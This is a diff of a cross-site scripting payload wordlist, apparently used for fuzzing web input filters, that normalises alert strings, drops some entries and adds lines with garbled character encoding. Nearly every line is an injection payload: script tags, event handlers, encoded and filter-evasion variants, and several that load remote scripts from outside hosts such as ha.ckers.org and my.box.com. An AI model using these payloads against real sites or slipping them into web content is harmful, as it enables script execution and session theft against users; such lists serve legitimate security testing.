@@ -1,9 +1,8 @@
-
 <script>alert('XSS')</script>
 "><script>alert('XSS')</script>
 "><img src=x onerror=alert('XSS');>
 " onfocus="alert('XSS')
-javascript:alert(ÔXSSÕ)
+javascript:alert(1)
 </textarea><script>alert(456)</script>
 ><script>alert('XSS')</script>
 %3Cscript%3Ealert('XSS')%3C/script%3E
@@ -16,9 +15,6 @@ javascript:alert(ÔXSSÕ)
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 <IMG SRC=j&#X41vascript:alert('XSS')>
 <body onload=alert('XSS')>
-<script>alert(123)</script>
-<script>alert("hellox worldss");</script>
-javascript:alert("hellox worldss")
 <img src="javascript:alert('XSS');">
 <img src=javascript:alert(&quot;XSS&quot;)>
 <"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
@@ -33,28 +29,28 @@ javascript:alert("hellox worldss")
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
-<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>alert("XSS")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
 <script>alert("XSS");</script>&search=1
 0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
 <h1><font color=blue>hellox worldss</h1>
-<BODY ONLOAD=alert('hellox worldss')>
+<BODY ONLOAD=alert('XSS')>
 <input onfocus=write(XSS) autofocus>
 <input onblur=write(XSS) autofocus><input autofocus>
 <body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
-<form><button formaction="javascript:alert(XSS)">lol
-<!--<img src="--><img src=x onerror=alert(XSS)//">
-<![><img src="]><img src=x onerror=alert(XSS)//">
-<style><img src="</style><img src=x onerror=alert(XSS)//">
-<? foo="><script>alert(1)</script>">
-<! foo="><script>alert(1)</script>">
-</ foo="><script>alert(1)</script>">
-<? foo="><x foo='?><script>alert(1)</script>'>">
-<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
-<% foo><x foo="%><script>alert(123)</script>">
+<form><button formaction="javascript:alert('XSS')">lol
+<!--<img src="--><img src=x onerror=alert('XSS')//">
+<![><img src="]><img src=x onerror=alert('XSS')//">
+<style><img src="</style><img src=x onerror=alert('XSS')//">
+<? foo="><script>alert('XSS')</script>">
+<! foo="><script>alert('XSS')</script>">
+</ foo="><script>alert('XSS')</script>">
+<? foo="><x foo='?><script>alert(\'XSS\')</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert('XSS')</script>">
+<% foo><x foo="%><script>alert('XSS')</script>">
 <div style="font-family:'foo&#10;;color:red;';">LOL
 LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
 <script>({0:#0=alert/#0#/#0#(0)})</script>
-<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert('XSS')</script></svg>
 &lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
 \\";alert('XSS');//
 &lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
@@ -76,7 +72,7 @@ LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green
 &lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
 &lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
 &lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
-žscriptualert(EXSSE)ž/scriptu
+Å¾scriptualert(EXSSE)Å¾/scriptu
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
@@ -141,7 +137,7 @@ Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
 &lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
-&lt;A HREF=\"htt	p&#58;//6	6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
@@ -257,7 +253,7 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-¼script¾alert(¢XSS¢)¼/script¾
+Â¼scriptÂ¾alert(Â¢XSSÂ¢)Â¼/scriptÂ¾
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
@@ -275,42 +271,39 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
-<form><button formaction="javascript:alert(123)">crosssitespt
-<frameset onload=alert(123)>
-<!--<img src="--><img src=x onerror=alert(123)//">
-<style><img src="</style><img src=x onerror=alert(123)//">
+<form id="test" /><button form="test" formaction="javascript:alert('XSS')">TESTHTML5FORMACTION
+<form><button formaction="javascript:alert('XSS')">crosssitespt
+<frameset onload=alert('XSS')>
+<!--<img src="--><img src=x onerror=alert('XSS')//">
+<style><img src="</style><img src=x onerror=alert('XSS')//">
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
 <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<embed src="javascript:alert(1)">
-<? foo="><script>alert(1)</script>">
-<! foo="><script>alert(1)</script>">
-</ foo="><script>alert(1)</script>">
-<script>({0:#0=alert/#0#/#0#(123)})</script>
-<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
-<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
-<script src="#">{alert(1)}</script>;1
-<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
-<svg xmlns="#"><script>alert(1)</script></svg>
-<svg onload="javascript:alert(123)" xmlns="#"></svg>
-<iframe xmlns="#" src="javascript:alert(1)"></iframe>
-+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
-%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
-+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
-%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
-%253cscript%253ealert(document.cookie)%253c/script%253e
-“><s”%2b”cript>alert(document.cookie)</script>
-“><ScRiPt>alert(document.cookie)</script>
-“><<script>alert(document.cookie);//<</script>
-foo%00<script>alert(document.cookie)</script>
-<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
-%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
-‘; alert(document.cookie); var foo=’
-foo\’; alert(document.cookie);//’;
-</script><script >alert(document.cookie)</script>
-<img src=asdf onerror=alert(document.cookie)>
-<BODY ONLOAD=alert(’XSS’)>
-<script>alert(1)</script>
-"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
-<video src=1 onerror=alert(1)>
-<audio src=1 onerror=alert(1)>
+<embed src="javascript:alert('XSS')">
+<? foo="><script>alert('XSS')</script>">
+<! foo="><script>alert('XSS')</script>">
+</ foo="><script>alert('XSS')</script>">
+<script>({0:#0=alert/#0#/#0#('XSS')})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert('XSS')}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(\'XSS\')')()</script>
+<script src="#">{alert('XSS')}</script>;1
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(\'XSS\')',384,null,'rsa-dual-use')</script>
+<svg xmlns="#"><script>alert('XSS')</script></svg>
+<svg onload="javascript:alert('XSS')" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:alert('XSS')"></iframe>
++ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
+%2BADw-script+AD4-alert('XSS')%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert('XSS')+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28'XSS'%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert('XSS')%253c/script%253e
+â€œ><sâ€%2bâ€cript>alert('XSS')</script>
+â€œ><ScRiPt>alert('XSS')</script>
+â€œ><<script>alert('XSS');//<</script>
+foo<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+%22/%3E%3CBODY%20onload=â€™document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)â€™%3E
+â€˜; alert('XSS'); var foo=â€™
+foo\â€™; alert('XSS');//â€™;
+</script><script >alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
